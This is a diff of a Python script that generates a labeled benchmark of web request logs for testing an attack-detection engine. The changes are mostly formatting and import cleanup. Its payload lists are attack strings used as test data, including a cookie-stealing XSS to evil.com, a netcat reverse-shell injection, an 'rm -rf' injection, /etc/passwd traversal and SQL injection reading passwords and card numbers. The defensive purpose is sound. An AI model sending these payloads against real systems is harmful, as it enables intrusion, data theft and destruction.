@@ -1,14 +1,8 @@
-import time
-import os
-import sys
 import json
+import os
 import urllib.parse
-from datetime import datetime, timezone, timedelta
-from typing import List, Dict, Tuple
+from datetime import UTC, datetime, timedelta
 
-from app.parsers.factory import ParserFactory
-from app.detection.engine import DetectionEngine
-from app.schemas.log_event import LogEvent
 
 def create_labeled_dataset(output_path: str = "sample_data/labeled_benchmark.json"):
     """
@@ -16,17 +10,33 @@ def create_labeled_dataset(output_path: str = "sample_data/labeled_benchmark.jso
     Ground truth labels: 'BENIGN', 'sqli', 'xss', 'path_traversal', 'cmd_injection', 'dir_enum', 'brute_force'
     """
     entries = []
-    
+
     # 1. Benign Traffic Samples from diverse endpoints (500 benign events)
     benign_endpoints = [
-        "/", "/index.html", "/about.us", "/contact", "/products", "/categories?cat=electronics",
-        "/search?q=laptop", "/images/logo.png", "/static/css/theme.css", "/static/js/bundle.js",
-        "/api/v1/health", "/api/v1/status", "/blog/post/2026/05/security-updates", "/docs",
-        "/cart/view", "/checkout/shipping", "/faq", "/services", "/pricing", "/favicon.ico"
+        "/",
+        "/index.html",
+        "/about.us",
+        "/contact",
+        "/products",
+        "/categories?cat=electronics",
+        "/search?q=laptop",
+        "/images/logo.png",
+        "/static/css/theme.css",
+        "/static/js/bundle.js",
+        "/api/v1/health",
+        "/api/v1/status",
+        "/blog/post/2026/05/security-updates",
+        "/docs",
+        "/cart/view",
+        "/checkout/shipping",
+        "/faq",
+        "/services",
+        "/pricing",
+        "/favicon.ico",
     ]
-    
-    base_time = datetime(2026, 6, 1, 10, 0, 0, tzinfo=timezone.utc)
-    
+
+    base_time = datetime(2026, 6, 1, 10, 0, 0, tzinfo=UTC)
+
     for i in range(500):
         ep = benign_endpoints[i % len(benign_endpoints)]
         ip = f"192.168.1.{10 + (i % 200)}"
@@ -46,7 +56,7 @@ def create_labeled_dataset(output_path: str = "sample_data/labeled_benchmark.jso
         "/profile?id=5' WAITFOR DELAY '0:0:5'--",
         "/search?term=UNION SELECT password FROM accounts",
         "/query?val=1' AND 1=1--",
-        "/view?doc=99 UNION SELECT id, credit_card FROM payments"
+        "/view?doc=99 UNION SELECT id, credit_card FROM payments",
     ]
     for i in range(50):
         payload = sqli_payloads[i % len(sqli_payloads)]
@@ -67,7 +77,7 @@ def create_labeled_dataset(output_path: str = "sample_data/labeled_benchmark.jso
         "/guestbook?msg=<script>document.location='http://evil.com?c='+document.cookie;</script>",
         "/test?p=<input onfocus=alert(1) autofocus>",
         "/item?tag=<details open ontoggle=alert(1)>",
-        "/forum?title=<a href='javascript:alert(1)'>click me</a>"
+        "/forum?title=<a href='javascript:alert(1)'>click me</a>",
     ]
     for i in range(50):
         payload = xss_payloads[i % len(xss_payloads)]
@@ -88,7 +98,7 @@ def create_labeled_dataset(output_path: str = "sample_data/labeled_benchmark.jso
         "/get_doc?file=../../../../../../var/log/syslog",
         "/load?template=../../conf/server.xml",
         "/view_file?f=c:\\windows\\system32\\cmd.exe",
-        "/assets/images/../../../etc/passwd"
+        "/assets/images/../../../etc/passwd",
     ]
     for i in range(50):
         payload = traversal_payloads[i % len(traversal_payloads)]
@@ -109,7 +119,7 @@ def create_labeled_dataset(output_path: str = "sample_data/labeled_benchmark.jso
         "/check?ip=8.8.8.8; sleep 5",
         "/admin/diag?ip=10.0.0.1 | netstat -an",
         "/test?host=127.0.0.1; nc -e /bin/sh 10.0.0.1 4444",
-        "/service/restart?svc=nginx; rm -rf /tmp/data"
+        "/service/restart?svc=nginx; rm -rf /tmp/data",
     ]
     for i in range(50):
         payload = cmd_payloads[i % len(cmd_payloads)]
@@ -121,8 +131,16 @@ def create_labeled_dataset(output_path: str = "sample_data/labeled_benchmark.jso
 
     # 6. Directory Enumeration / Scanner Scans (50 events)
     dir_paths = [
-        "/.git/config", "/.env", "/.htaccess", "/admin", "/wp-admin", "/backup.zip",
-        "/phpmyadmin", "/config.php.bak", "/server-status", "/database.sql"
+        "/.git/config",
+        "/.env",
+        "/.htaccess",
+        "/admin",
+        "/wp-admin",
+        "/backup.zip",
+        "/phpmyadmin",
+        "/config.php.bak",
+        "/server-status",
+        "/database.sql",
     ]
     # In dir_enum, scans come from specific scanner IPs hitting multiple paths
     scanner_ip = "198.51.100.99"
@@ -144,9 +162,12 @@ def create_labeled_dataset(output_path: str = "sample_data/labeled_benchmark.jso
     os.makedirs(os.path.dirname(output_path), exist_ok=True)
     with open(output_path, "w", encoding="utf-8") as f:
         json.dump(entries, f, indent=2)
-        
-    print(f"Generated labeled benchmark dataset: {len(entries)} events saved to {output_path}")
+
+    print(
+        f"Generated labeled benchmark dataset: {len(entries)} events saved to {output_path}"
+    )
     return entries
+
 
 if __name__ == "__main__":
     create_labeled_dataset()
